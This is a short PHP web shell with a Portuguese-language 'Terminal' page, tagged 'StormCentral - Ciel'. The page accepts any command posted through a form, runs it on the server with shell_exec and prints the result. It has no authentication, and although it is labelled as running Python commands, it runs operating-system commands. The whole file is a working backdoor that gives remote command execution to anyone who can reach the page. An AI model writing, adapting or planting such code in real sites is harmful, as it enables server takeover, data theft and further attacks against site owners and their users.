<?php
// StormCentral - Ciel
if (isset($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']);
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Terminal</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        .terminal {
            background-color: #000000;
            border-radius: 5px;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .terminal input[type="text"] {
            width: 100%;
            padding: 10px;
            background-color: #333333;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
        }
        .terminal input[type="submit"] {
            padding: 10px 20px;
            background-color: #00ff00;
            border: none;
            color: #000000;
            font-family: 'Courier New', Courier, monospace;
            cursor: pointer;
        }
        .terminal input[type="submit"]:hover {
            background-color: #00cc00;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <h1>Executar Comandos Python</h1>
        <form method="post">
            <input type="text" name="command" placeholder="Digite um comando Python...">
            <input type="submit" value="Executar">
        </form>
        <?php
        if (isset($output)) {
            echo "<pre>$output</pre>";
        }
        ?>
    </div>
</body>
</html>
